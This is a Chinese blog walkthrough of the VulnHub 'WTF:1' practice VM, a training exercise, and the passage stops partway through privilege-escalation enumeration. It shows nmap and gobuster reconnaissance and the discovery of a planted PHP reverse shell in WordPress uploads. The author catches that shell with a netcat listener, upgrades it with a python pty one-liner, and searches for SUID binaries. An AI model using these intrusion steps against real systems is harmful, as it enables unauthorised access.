@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="名称：WTF：1发布日期：2019年11月22日 下载：  Download: https:&#x2F;&#x2F;mega.nz&#x2F;#!dmZGDQRa!eiUQN_w_qZODlonwe8RM5WsOHFrpi3wqIyFfVc2DyU0 Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;wtf&#x2F;wtf.rar Download (Torrent): https:&#x2F;&#x2F;d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[WTF-1]">
+<meta property="og:url" content="https://fdlucifer.github.io/2019/12/24/WTF-1/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="名称：WTF：1发布日期：2019年11月22日 下载：  Download: https:&#x2F;&#x2F;mega.nz&#x2F;#!dmZGDQRa!eiUQN_w_qZODlonwe8RM5WsOHFrpi3wqIyFfVc2DyU0 Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;wtf&#x2F;wtf.rar Download (Torrent): https:&#x2F;&#x2F;d">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub87.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub89.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub88.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub90.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub91.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub92.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub93.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub94.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2019-12-24T03:47:32.000Z">
+<meta property="article:modified_time" content="2020-08-16T17:00:52.170Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub87.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2019/12/24/WTF-1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2019/12/24/WTF-1/","path":"2019/12/24/WTF-1/","title":"vulnhub靶机渗透[WTF-1]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[WTF-1] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">网络配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getshell"><span class="nav-number">3.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2019/12/24/WTF-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[WTF-1] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[WTF-1]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2019-12-24 11:47:32" itemprop="dateCreated datePublished" datetime="2019-12-24T11:47:32+08:00">2019-12-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 01:00:52" itemprop="dateModified" datetime="2020-08-17T01:00:52+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>名称：WTF：1<br>发布日期：2019年11月22日</p>
+<p>下载：</p>
+<ul>
+<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9tZWdhLm56LyMhZG1aR0RRUmEhZWlVUU5fd19xWk9EbG9ud2U4Uk01V3NPSEZycGkzd3FJeUZmVmMyRHlVMA==">https://mega.nz/#!dmZGDQRa!eiUQN_w_qZODlonwe8RM5WsOHFrpi3wqIyFfVc2DyU0<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93dGYvd3RmLnJhcg==">https://download.vulnhub.com/wtf/wtf.rar<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93dGYvd3RmLnJhci50b3JyZW50">https://download.vulnhub.com/wtf/wtf.rar.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>描述：<br>初学者-中级机器，您的目标是获取&#x2F;root&#x2F;flag.txt。<br>记住,很好的列举！基于VMware,您可能会遇到VB问题。</p>
+<span id="more"></span>
+
+<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>一开始安装虚拟机打开的时候会遇到描述中所说的获取不到ip的现象参考文章<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTE4NzcxL2FydGljbGUvZGV0YWlscy8xMDM2MzY4OTA=">Vulnhub靶机检测不到IP地址<i class="fa fa-external-link-alt"></i></span>，这篇文章写的很详细，不用我多说，自己看着一步步配置就行。</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.134</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 00:0C:29:CA:25:F7 (VMware)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sS -sV -T5 -A -p- -v --script=vuln 192.168.142.134</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.4.38: </span></span><br><span class="line"><span class="string">|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211</span></span><br><span class="line"><span class="string">|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082</span></span><br><span class="line"><span class="string">|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097</span></span><br><span class="line"><span class="string">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span></span><br><span class="line"><span class="string">|       CVE-2019-0215   6.0     https://vulners.com/cve/CVE-2019-0215</span></span><br><span class="line"><span class="string">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span></span><br><span class="line"><span class="string">|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081</span></span><br><span class="line"><span class="string">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span></span><br><span class="line"><span class="string">|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196</span></span><br><span class="line"><span class="string">|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197</span></span><br><span class="line"><span class="string">|_      CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span></span><br></pre></td></tr></table></figure>
+
+<p>开了22和80两个端口</p>
+<p>下载github上评分22.1k的seclists字典</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># apt -y install seclists</span></span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树       </span><br><span class="line">正在读取状态信息... 完成       </span><br><span class="line">下列软件包是自动安装的并且现在不需要了：</span><br><span class="line">  apt-file command-not-found libapt-pkg-perl libexporter-tiny-perl libisl21 libjim0.77</span><br><span class="line">  liblist-moreutils-perl libregexp-assemble-perl</span><br><span class="line">使用<span class="string">&#x27;apt autoremove&#x27;</span>来卸载它(它们)。</span><br><span class="line">下列【新】软件包将被安装：</span><br><span class="line">  seclists</span><br><span class="line">升级了 0 个软件包，新安装了 1 个软件包，要卸载 0 个软件包，有 0 个软件包未被升级。</span><br><span class="line">需要下载 276 MB 的归档。</span><br><span class="line">解压缩后会消耗 1,033 MB 的额外空间。</span><br><span class="line">获取:1 https://mirrors.ustc.edu.cn/kali kali-rolling/main amd64 seclists all 2019.4-0kali2 [276 MB]</span><br><span class="line">已下载 276 MB，耗时 45秒 (6,170 kB/s)                                                                 </span><br><span class="line">正在选中未选择的软件包 seclists。</span><br><span class="line">(正在读取数据库 ... 系统当前共安装有 318480 个文件和目录。)</span><br><span class="line">准备解压 .../seclists_2019.4-0kali2_all.deb  ...</span><br><span class="line">正在解压 seclists (2019.4-0kali2) ...</span><br><span class="line">正在设置 seclists (2019.4-0kali2) ...</span><br></pre></td></tr></table></figure>
+<p>gobuster扫一波发现zhkh目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># gobuster dir --url http://192.168.142.134/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.142.134/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2019/12/24 00:34:22 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/javascript (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">[ERROR] 2019/12/24 00:34:24 [!] parse http://192.168.142.134/error_log: net/url: invalid control character <span class="keyword">in</span> URL</span><br><span class="line">/zhkh (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2019/12/24 00:34:27 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p>访问<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEzNC96aGtoLyVFNSU4RiU5MSVFNyU4RSVCMCVFNiU5OCVBRndvcmRwcmVzczUuMyVFNyU4OSU4OCVFNiU5QyVBQyVFNyVBOCU4QiVFNSVCQSU4RiVFNiU5MCVBRCVFNSVCQiVCQSVFNyU5QSU4NA==">http://192.168.142.134/zhkh/发现是wordpress5.3版本程序搭建的<i class="fa fa-external-link-alt"></i></span></p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub87.jpg"></p>
+<p>burp添加规则如下图所示即可访问完整的正常页面</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub89.jpg"></p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub88.jpg"></p>
+<p>爆破后台密码和寻找wordpress漏洞无果之后下一步操作</p>
+<p>由于提示good enumeration,进入wp-content&#x2F;uploads&#x2F;目录下有新发现shell.php</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub90.jpg"></p>
+<p>访问shell.php出现错误提示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) </span><br></pre></td></tr></table></figure>
+
+<p>看错误得知是php-reverse-shell，就是反弹shell的php木马</p>
+<p>用wireshark抓包查看php-reverse-shell请求的ip和端口以便于nc后续本地监听需要</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub91.jpg"></p>
+<p>得知请求ip为192.168.1.14，端口为5555</p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>NAT模式的网络配置改成192.168.1.0&#x2F;24，之后给kali配置一个静态IP 192.168.1.14，然后重启kali和wtf靶机，访问php-reverse-shell</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub92.jpg"></p>
+<p>成功弹回shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5555</span></span><br><span class="line">listening on [any] 5555 ...</span><br><span class="line">192.168.1.15: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.1.14] from (UNKNOWN) [192.168.1.15] 47192</span><br><span class="line">Linux wtf 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux</span></span><br><span class="line"> 01:56:54 up 1 min,  0 <span class="built_in">users</span>,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python3 -c &#x27;</span>import pty;pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">www-data@wtf:/$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">bin   home            lib32       media  root  sys  vmlinuz</span></span><br><span class="line"><span class="string">boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old</span></span><br><span class="line"><span class="string">dev   initrd.img.old  libx32      opt    sbin  usr</span></span><br><span class="line"><span class="string">etc   lib             lost+found  proc   srv   var</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看SUID权限可执行文件，没有可用的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@wtf:/$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/su</span><br><span 